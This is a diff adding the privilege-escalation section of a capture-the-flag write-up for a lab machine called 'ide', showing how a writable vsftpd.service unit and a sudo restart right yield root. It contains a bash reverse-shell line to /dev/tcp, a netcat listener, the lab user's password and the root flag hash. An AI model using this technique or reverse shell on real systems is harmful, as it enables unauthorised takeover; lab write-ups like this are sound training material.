@@ -382,6 +382,134 @@ drac@ide:~$ cat user.txt
 
 ## Vertical Escalation
 
+Now it's time for vertical escalation, one of the first commands you should run whenever you log into a remote system is ```sudo -l```. This will show us all programs we can run as ```sudo```.
 
+```
+drac@ide:~$ sudo -l
+
+[sudo] password for drac: Th3dRaCULa1sR3aL
+Matching Defaults entries for drac on ide:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User drac may run the following commands on ide:
+    (ALL : ALL) /usr/sbin/service vsftpd restart
+```
+
+The results from the ```sudo -l``` command show us that we have the ability to ```restart``` the ```vsftpd``` ```service```.
+
+We also have the ability to edit the ```vsftpd.service``` file so we'll edit the file with ```nano``` to start a reverse shell on startup.
+
+```nano /lib/systemd/system/vsftpd.service```
+
+Originally the ```vsftpd.service``` file should look like this...
+
+```
+[Unit]
+Description=vsftpd FTP server
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
+ExecReload=/bin/kill -HUP $MAINPID
+ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
+
+[Install]
+WantedBy=multi-user.target
+```
+
+The line we're changing in the file is this one...
+
+```ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf```
+
+We'll change the above line to the one below, where you'll put your own IP and Port.
+
+```ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<IP_Address>/<Port> 0>&1'```
+
+Once you've finished editing the ```vsftpd.service``` file it should look like this...
+
+```
+[Unit]
+Description=vsftpd FTP server
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<IP_Address>/<Port> 0>&1'
+ExecReload=/bin/kill -HUP $MAINPID
+ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Next we'll start our ```Netcat``` listener.
+
+```
+$ nc -lnvp <PORT>
+
+Listening on 0.0.0.0 <PORT>
+```
+
+Before we ```restart``` the ```vsftpd``` ```service``` as ```sudo``` we need to use the command ```systemctl daemon-reload```, otherwise we would see the following output.
+
+```
+drac@ide:~$ sudo /usr/sbin/service vsftpd restart
+
+Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.
+```
+
+Let's run the ```systemctl daemon-reload``` command and provide ```Th3dRaCULa1sR3aL``` as the password for ```drac```.
+
+```
+drac@ide:~$ systemctl daemon-reload
+
+==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
+Authentication is required to reload the systemd state.
+Authenticating as: drac
+Password: Th3dRaCULa1sR3aL
+==== AUTHENTICATION COMPLETE ===
+```
+
+Finally we can ```restart``` the ```vsftpd``` ```service``` as ```sudo```.
+
+```
+drac@ide:~$ sudo /usr/sbin/service vsftpd restart
+
+[sudo] password for drac: Th3dRaCULa1sR3aL
+```
+
+If we did the above steps correctly we should see that we have root access on our ```Netcat``` listener.
+
+```
+Listening on 0.0.0.0 1234
+
+root@ide:/#
+```
+
+Now that we're root let's find the root flag by listing all contents in the ```/root``` directory.
+
+```
+root@ide:/# ls -la /root
+
+ls -la /root
+total 40
+drwx------  6 root root 4096 Jun 18  2021 .
+drwxr-xr-x 24 root root 4096 Jul  9  2021 ..
+lrwxrwxrwx  1 root root    9 Jun 18  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Jun 18  2021 .cache
+drwx------  3 root root 4096 Jun 18  2021 .gnupg
+drwxr-xr-x  3 root root 4096 Jun 18  2021 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-r--------  1 root root   33 Jun 18  2021 root.txt
+-rw-r--r--  1 root root   66 Jun 18  2021 .selected_editor
+drwx------  2 root root 4096 Jun 17  2021 .ssh
+```
+
+There's our flag, in a file named ```root.txt```. If we ```cat``` it we'll see the following.
+
+```ce258cb16f47f1c66f0b0b77f4e0fb8d```
 
 [Back To Top](#ide "Jump To Top")
